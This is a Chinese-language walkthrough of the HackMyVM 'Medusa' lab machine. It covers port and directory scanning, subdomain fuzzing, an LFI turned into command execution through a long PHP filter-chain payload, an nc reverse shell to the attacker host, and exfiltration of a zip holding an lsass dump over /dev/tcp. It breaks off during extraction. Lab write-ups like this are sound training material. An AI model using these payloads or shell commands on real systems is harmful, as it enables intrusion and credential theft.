|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)
|_  256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:5D:E9:45 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms 192.168.205.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.08 seconds
                                                           
```

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.145
Connected to 192.168.205.145.
220 (vsFTPd 3.0.3)
Name (192.168.205.145:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp&gt; 
ftp&gt; exit
221 Goodbye.
```

不许登，那去看80。是个默认页

![image-20250331190711601](https://7r1umphk.github.io/image/20250331190711760.png)

有关类似是用户名的东西Kraken，不管先，我们目录爆破一下

ps:因为它有一个manual路径会爆出很多没有利用价值的二级目录，所以我们这次用gobuster，然后再过滤一些403的没用状态码

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.145 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.145
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10674]
/.                    (Status: 200) [Size: 10674]
/manual               (Status: 301) [Size: 319] [--&gt; http://192.168.205.145/manual/]
/hades                (Status: 301) [Size: 318] [--&gt; http://192.168.205.145/hades/]
Progress: 598000 / 598005 (100.00%)
===============================================================
Finished
===============================================================
```

接着爆破

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.145/hades/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.145/hades/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/.                    (Status: 200) [Size: 0]
/door.php             (Status: 200) [Size: 555]
Progress: 598000 / 598005 (100.00%)
===============================================================
Finished
===============================================================
```

访问/door.php

![image-20250331190726085](https://7r1umphk.github.io/image/20250331190726175.png)

输入之前获得的Kraken

ps:有点搞笑，它规定了只可以输入6个字符

![image-20250331190733042](https://7r1umphk.github.io/image/20250331190733131.png)

获得一个域名，我们加上，并且爆破一下子域

```
┌──(kali㉿kali)-[~/test]
└─$ ffuf -u http://medusa.hmv -H 'Host: FUZZ.medusa.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 3423  

        /'___\  /'___\           /'___\     
       /\ \__/ /\ \__/  __  __  /\ \__/     
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\    
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/    
         \ \_\   \ \_\  \ \____/  \ \_\     
          \/_/    \/_/   \/___/    \/_/     

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://medusa.hmv
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.medusa.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3423
________________________________________________

dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 164ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

加上访问

![image-20250331190750401](https://7r1umphk.github.io/image/20250331190750557.png)
 没看到啥，目录爆破

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://dev.medusa.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1973]
/css                  (Status: 301) [Size: 314] [--&gt; http://dev.medusa.hmv/css/]
/files                (Status: 301) [Size: 316] [--&gt; http://dev.medusa.hmv/files/]
/assets               (Status: 301) [Size: 317] [--&gt; http://dev.medusa.hmv/assets/]
/.                    (Status: 200) [Size: 1973]
/manual               (Status: 301) [Size: 317] [--&gt; http://dev.medusa.hmv/manual/]
/robots.txt           (Status: 200) [Size: 489]
Progress: 470664 / 598005 (78.71%)
Progress: 491780 / 598005 (82.24%)
```

接着爆破/files

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://dev.medusa.hmv/files/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv/files/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/system.php           (Status: 200) [Size: 0]
/.                    (Status: 200) [Size: 0]
/readme.txt           (Status: 200) [Size: 144]
┌──(kali㉿kali)-[~/test]
└─$ curl http://dev.medusa.hmv/files/readme.txt
-----------------------------------------------
+  Don't trust your eyes, trust your instinct +
-----------------------------------------------
                                                 
```

谜语人滚出哥谭

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u 'http://dev.medusa.hmv/files/system.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.medusa.hmv/files/system.php?FUZZ=id
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================


Total time: 60.95589
Processed Requests: 119600
Filtered Requests: 119600
Requests/sec.: 1962.074

                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================

000000167:   200        27 L     40 W       1452 Ch     'view'                                                             
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 2.243865
Processed Requests: 309
Filtered Requests: 308
Requests/sec.: 137.7087
```

看眼有没有密钥

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://dev.medusa.hmv/files/system.php?view=/home/spectre/.ssh/id_rsa
                           
```

到这我习惯就是测php filter

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://dev.medusa.hmv/files/system.php?view=php://filter/convert.base64-encode/resource=/etc/passwd
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTA0OjExMDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA1OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3BlY3RyZTp4OjEwMDA6MTAwMDpzcGVjdHJlLCwsOi9ob21lL3NwZWN0cmU6L2Jpbi9iYXNoCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgpmdHA6eDoxMDY6MTEzOmZ0cCBkYWVtb24sLCw6L3Nydi9mdHA6L3Vzci9zYmluL25vbG9naW4K                                                                                                                                    
```

那直接执行命令试试

```
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id' --output -
uid=33(www-data) gid=33(www-data) groups=33(www-data)
�B�0���&gt;==�@C������&gt;==�@C������&gt;==�@C������&gt;==�@C������&gt;==�@C������&gt;==�@          
```

弹shell

```
http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc%20192.168.205.128%208888%20-e%20/bin/bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.145] 49190
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
www-data@medusa:/var/www/dev/files$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Jan 19  2023 .
drwxr-xr-x 5 root root 4096 Jan 19  2023 ..
-rw-r--r-- 1 root root    0 Jan 15  2023 index.php
-rw-r--r-- 1 root root  144 Jan 18  2023 readme.txt
-rw-r--r-- 1 root root  110 Jan 19  2023 system.php
www-data@medusa:/var/www/dev/files$ cd ..
www-data@medusa:/var/www/dev$ ls -al
total 28
drwxr-xr-x 5 root root 4096 Jan 19  2023 .
drwxr-xr-x 4 root root 4096 Jan 15  2023 ..
drwxr-xr-x 2 root root 4096 Jan 15  2023 assets
drwxr-xr-x 2 root root 4096 Jan 15  2023 css
drwxr-xr-x 2 root root 4096 Jan 19  2023 files
-rw-r--r-- 1 root root 1973 Jan 19  2023 index.html
-rw-r--r-- 1 root root  489 Jan 18  2023 robots.txt
www-data@medusa:/var/www/dev$ cd ..
www-data@medusa:/var/www$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Jan 15  2023 .
drwxr-xr-x 12 root root 4096 Jan 15  2023 ..
drwxr-xr-x  5 root root 4096 Jan 19  2023 dev
drwxr-xr-x  3 root root 4096 Jan 19  2023 html
www-data@medusa:/var/www$ cd html/
www-data@medusa:/var/www/html$ ls -al
total 24
drwxr-xr-x 3 root root  4096 Jan 19  2023 .
drwxr-xr-x 4 root root  4096 Jan 15  2023 ..
drwxr-xr-x 2 root root  4096 Jan 30  2023 hades
-rw-r--r-- 1 root root 10674 Jan 19  2023 index.html
www-data@medusa:/var/www/html$ cd hades/
www-data@medusa:/var/www/html/hades$ ls -al
total 20
drwxr-xr-x 2 root root 4096 Jan 30  2023 .
drwxr-xr-x 3 root root 4096 Jan 19  2023 ..
-rw-r--r-- 1 root root  265 Jan 19  2023 d00r_validation.php
-rw-r--r-- 1 root root  555 Jan 30  2023 door.php
-rw-r--r-- 1 root root    0 Jan 19  2023 index.php
-rw-r--r-- 1 root root  198 Jan 19  2023 styles.css
www-data@medusa:/var/www/html/hades$ cd /home/
www-data@medusa:/home$ ls -al
total 12
drwxr-xr-x  3 root    root    4096 Jan 15  2023 .
drwxr-xr-x 19 root    root    4096 Jan 15  2023 ..
drwxr-xr-x  3 spectre spectre 4096 Jan 18  2023 spectre
www-data@medusa:/home$ sudo -l
sudo: unable to resolve host medusa: Name or service not known

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
www-data@medusa:/home$ cd spectre/
www-data@medusa:/home/spectre$ ls -al
total 32
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .
drwxr-xr-x 3 root    root    4096 Jan 15  2023 ..
-rw------- 1 spectre spectre  197 Jan 21  2023 .bash_history
-rw-r--r-- 1 spectre spectre  220 Jan 15  2023 .bash_logout
-rw-r--r-- 1 spectre spectre 3526 Jan 15  2023 .bashrc
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .local
-rw-r--r-- 1 spectre spectre  807 Jan 15  2023 .profile
-rw------- 1 spectre spectre   44 Jan 18  2023 user.txt
www-data@medusa:/home/spectre$ find / -perm -4000 -type f 2&gt;/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
www-data@medusa:/home/spectre$ 
www-data@medusa:/home/spectre$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@medusa:/home/spectre$ ss -tnlup
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        511                                                    *:80                                                    *:*                                              
tcp                     LISTEN                   0                        32                                                     *:21                                                    *:*                                              
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                       
www-data@medusa:/home/spectre$ cd /opt/
www-data@medusa:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan 15  2023 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
www-data@medusa:/opt$ cd /tmp/
www-data@medusa:/tmp$ ls -al
total 8
drwxrwxrwt  2 root root 4096 Feb  4 04:40 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
www-data@medusa:/tmp$ cd /mnt/
www-data@medusa:/mnt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan 15  2023 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
www-data@medusa:/mnt$ cd /
www-data@medusa:/$ ls -la
total 72
drwxr-xr-x  19 root root  4096 Jan 15  2023 .
drwxr-xr-x  19 root root  4096 Jan 15  2023 ..
drwxr-xr-x   2 root root  4096 Jan 18  2023 ...
lrwxrwxrwx   1 root root     7 Jan 15  2023 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Jan 15  2023 boot
drwxr-xr-x  17 root root  3140 Feb  4 04:40 dev
drwxr-xr-x  71 root root  4096 Feb  4 05:08 etc
drwxr-xr-x   3 root root  4096 Jan 15  2023 home
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img -&gt; boot/initrd.img-5.10.0-20-amd64
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Jan 15  2023 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Jan 15  2023 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 Jan 15  2023 lost+found
drwxr-xr-x   3 root root  4096 Jan 15  2023 media
drwxr-xr-x   2 root root  4096 Jan 15  2023 mnt
drwxr-xr-x   2 root root  4096 Jan 15  2023 opt
dr-xr-xr-x 148 root root     0 Feb  4 04:40 proc
drwx------   3 root root  4096 Jan 30  2023 root
drwxr-xr-x  19 root root   540 Feb  4 04:41 run
lrwxrwxrwx   1 root root     8 Jan 15  2023 sbin -&gt; usr/sbin
drwxr-xr-x   3 root root  4096 Jan 15  2023 srv
dr-xr-xr-x  13 root root     0 Feb  4 04:40 sys
drwxrwxrwt   2 root root  4096 Feb  4 04:40 tmp
drwxr-xr-x  14 root root  4096 Jan 15  2023 usr
drwxr-xr-x  12 root root  4096 Jan 15  2023 var
lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-20-amd64
lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
www-data@medusa:/$ cd .../
www-data@medusa:/...$ ls -al
total 12108
drwxr-xr-x  2 root     root         4096 Jan 18  2023 .
drwxr-xr-x 19 root     root         4096 Jan 15  2023 ..
-rw-------  1 www-data www-data 12387024 Jan 18  2023 old_files.zip
```

拷过去看看有啥

```
www-data@medusa:/...$ cat old_files.zip &gt; /dev/tcp/192.168.205.128/7777

#kali
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 7777 &gt; old_files.zip                
listening on [any] 7777 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.145] 46026
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ unzip old_files.zip
Archive:  old_files.zip
   skipping: lsass.DMP               need PK compat. v5.1 (can do v4.6)
                                       
┌──(kali㉿kali)-[~/test]
└─$ 7z x old_files.zip

